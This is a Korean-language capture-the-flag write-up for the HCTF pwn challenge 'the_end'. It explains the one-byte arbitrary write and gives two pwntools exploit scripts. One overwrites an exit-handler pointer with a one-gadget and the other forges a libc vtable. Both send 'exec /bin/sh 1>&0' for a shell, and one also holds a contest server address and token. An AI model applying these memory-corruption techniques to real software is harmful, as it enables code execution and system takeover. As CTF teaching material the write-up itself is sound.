# hctf - the_end

close(1)

close(2)

이 두함수 때문에 정적 출력이 되지 않는다.

그리고 어느 주소에나 1바이트씩 쓸 수 있다.



내가 생각한 exploit 방법

함수의 마지막에 exit를 불러오는데 exit를 불러오면

__exit_funcs라는 라이브러리 심볼 구조체를 가지고

'__run_exit_handlers'에 들어가는데 이때 '____rtld_global+3848'의 주소를 실행한다

따라서 __rtld_global+3848에 oneshot 주소를 넣으면 쉘을 딸수 있을거라 생각했다



<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div><div style="line-height:130%">5</div><div style="line-height:130%">6</div><div style="line-height:130%">7</div><div style="line-height:130%">8</div><div style="line-height:130%">9</div><div style="line-height:130%">10</div><div style="line-height:130%">11</div><div style="line-height:130%">12</div><div style="line-height:130%">13</div><div style="line-height:130%">14</div><div style="line-height:130%">15</div><div style="line-height:130%">16</div><div style="line-height:130%">17</div><div style="line-height:130%">18</div><div style="line-height:130%">19</div><div style="line-height:130%">20</div><div style="line-height:130%">21</div><div style="line-height:130%">22</div><div style="line-height:130%">23</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">from</span>&nbsp;pwn&nbsp;<span style="color:#a71d5d">import</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>process(<span style="color:#63a35c">'./the_end'</span>,env<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>{<span style="color:#63a35c">'LD_PRELOAD'</span>:<span style="color:#63a35c">'./libc-2.23.so'</span>})</div><div style="padding:0 6px; white-space:pre; line-height:130%">e<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>ELF(<span style="color:#63a35c">'./the_end'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">libc<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>e.libc</div><div style="padding:0 6px; white-space:pre; line-height:130%">ld<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>ELF(<span style="color:#63a35c">'/lib/x86_64-linux-gnu/ld-2.23.so'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">sla<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>r.sendlineafter</div><div style="padding:0 6px; white-space:pre; line-height:130%">ru<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>r.recvuntil</div><div style="padding:0 6px; white-space:pre; line-height:130%">sa<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>r.sendafter</div><div style="padding:0 6px; white-space:pre; line-height:130%">s<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>r.send</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">ru(<span style="color:#63a35c">'gift&nbsp;'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">leak<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#066de2">int</span>(ru(<span style="color:#63a35c">','</span>).replace(<span style="color:#63a35c">','</span>,<span style="color:#63a35c">''</span>),<span style="color:#0099cc">16</span>)<span style="color:#0086b3"></span><span style="color:#a71d5d">-</span>libc.symbols[<span style="color:#63a35c">'sleep'</span>]</div><div style="padding:0 6px; white-space:pre; line-height:130%">log.info(hex(leak))</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;<span style="color:#066de2">range</span>(<span style="color:#0099cc">5</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s(p64(leak<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0099cc">0x5f0f48</span><span style="color:#a71d5d">+</span>i))</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s(p64(leak<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0099cc">0xf02a4</span>)[i])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.sendline(<span style="color:#63a35c">'exec&nbsp;/bin/sh&nbsp;1&gt;&amp;0'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.interactive()</div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>



원래 풀이법

 vtable 만들어서 푼다.

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div><div style="line-height:130%">5</div><div style="line-height:130%">6</div><div style="line-height:130%">7</div><div style="line-height:130%">8</div><div style="line-height:130%">9</div><div style="line-height:130%">10</div><div style="line-height:130%">11</div><div style="line-height:130%">12</div><div style="line-height:130%">13</div><div style="line-height:130%">14</div><div style="line-height:130%">15</div><div style="line-height:130%">16</div><div style="line-height:130%">17</div><div style="line-height:130%">18</div><div style="line-height:130%">19</div><div style="line-height:130%">20</div><div style="line-height:130%">21</div><div style="line-height:130%">22</div><div style="line-height:130%">23</div><div style="line-height:130%">24</div><div style="line-height:130%">25</div><div style="line-height:130%">26</div><div style="line-height:130%">27</div><div style="line-height:130%">28</div><div style="line-height:130%">29</div><div style="line-height:130%">30</div><div style="line-height:130%">31</div><div style="line-height:130%">32</div><div style="line-height:130%">33</div><div style="line-height:130%">34</div><div style="line-height:130%">35</div><div style="line-height:130%">36</div><div style="line-height:130%">37</div><div style="line-height:130%">38</div><div style="line-height:130%">39</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">from</span>&nbsp;pwn&nbsp;<span style="color:#a71d5d">import</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">context.log_level<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">"debug"</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">libc<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>ELF(<span style="color:#63a35c">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">p&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;process(<span style="color:#63a35c">'the_end'</span>,env<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>{<span style="color:#63a35c">'LD_PRELOAD'</span>:<span style="color:#63a35c">'./libc-2.23.so'</span>})</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#999999">#p&nbsp;=&nbsp;remote('127.0.0.1',1234)</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">rem&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">if</span>&nbsp;rem&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0099cc">1</span>:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;remote(<span style="color:#63a35c">'150.109.44.250'</span>,<span style="color:#0099cc">20002</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(<span style="color:#63a35c">'Input&nbsp;your&nbsp;token:'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;p.sendline(<span style="color:#63a35c">'RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">sleep_ad&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;p.recvuntil(<span style="color:#63a35c">',&nbsp;good&nbsp;luck'</span>,drop<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>True).split(<span style="color:#63a35c">'&nbsp;'</span>)[<span style="color:#0086b3"></span><span style="color:#a71d5d">-</span><span style="color:#0099cc">1</span>]</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">libc_base&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;long(sleep_ad,<span style="color:#0099cc">16</span>)&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">-</span>&nbsp;libc.symbols[<span style="color:#63a35c">'sleep'</span>]</div><div style="padding:0 6px; white-space:pre; line-height:130%">one_gadget&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;libc_base&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>&nbsp;<span style="color:#0099cc">0xf02b0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">vtables&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_base&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>&nbsp;<span style="color:#0099cc">0x3C56F8</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">fake_vtable&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;libc_base&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>&nbsp;<span style="color:#0099cc">0x3c5588</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">target_addr&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;libc_base&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>&nbsp;<span style="color:#0099cc">0x3c55e0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#066de2">print</span>&nbsp;<span style="color:#63a35c">'libc_base:&nbsp;'</span>,hex(libc_base)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#066de2">print</span>&nbsp;<span style="color:#63a35c">'one_gadget:'</span>,hex(one_gadget)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#066de2">print</span>&nbsp;<span style="color:#63a35c">'exit_addr:'</span>,hex(libc_base&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>&nbsp;libc.symbols[<span style="color:#63a35c">'exit'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#999999">#&nbsp;gdb.attach(p)</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;<span style="color:#066de2">range</span>(<span style="color:#0099cc">2</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.send(p64(vtables<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i))</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.send(p64(fake_vtable)[i])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;<span style="color:#066de2">range</span>(<span style="color:#0099cc">3</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;p.send(p64(target_addr<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i))</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;p.send(p64(one_gadget)[i])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">p.sendline(<span style="color:#63a35c">"exec&nbsp;/bin/sh&nbsp;1&gt;&amp;0"</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">p.interactive()</div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
